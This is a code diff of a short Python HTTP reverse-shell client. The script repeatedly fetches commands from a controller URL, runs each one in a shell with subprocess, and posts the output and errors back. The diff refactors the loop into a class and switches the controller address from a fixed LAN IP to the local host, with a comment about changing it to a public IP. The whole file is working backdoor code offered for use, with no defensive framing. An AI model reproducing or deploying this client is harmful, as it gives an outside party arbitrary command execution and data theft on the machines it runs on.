@@ -1,24 +1,31 @@
 import subprocess
 import time
 import requests
-import os
+import socket
 
-URL = 'http://192.168.56.1'
+# This is for a localhost connection, change it in case you're gonna use a public IP or another in general.
+URL = 'http://' + socket.gethostbyname(socket.gethostname())
 
-while True:
-    request = requests.get(URL)
-    cmd = request.text
+class http_client:
 
-    if 'terminate' in cmd:
-        break
+    def create_connection():
+        req = requests.get(URL)
+        cmd = req.text
 
-    else:
-        cmdPrompt = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        if 'stop' in cmd:
+            quit()
+        else:
+            cmdPrompt = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            # POST result or error.
+            post_response = requests.post(url=URL, data=cmdPrompt.stdout.read() )
+            post_response = requests.post(url=URL, data=cmdPrompt.stderr.read() ) 
 
-        post_response = requests.post(url=URL, data=cmdPrompt.stdout.read() ) # POST the result 
-        post_response = requests.post(url=URL, data=cmdPrompt.stderr.read() ) # or the error if there's any.
+            time.sleep(3)
 
-        time.sleep(3)
-        
+if __name__ == '__main__':
+    # Prevent connection from terminating after every request.
+    while True:
+        http_client.create_connection()
+
     
         
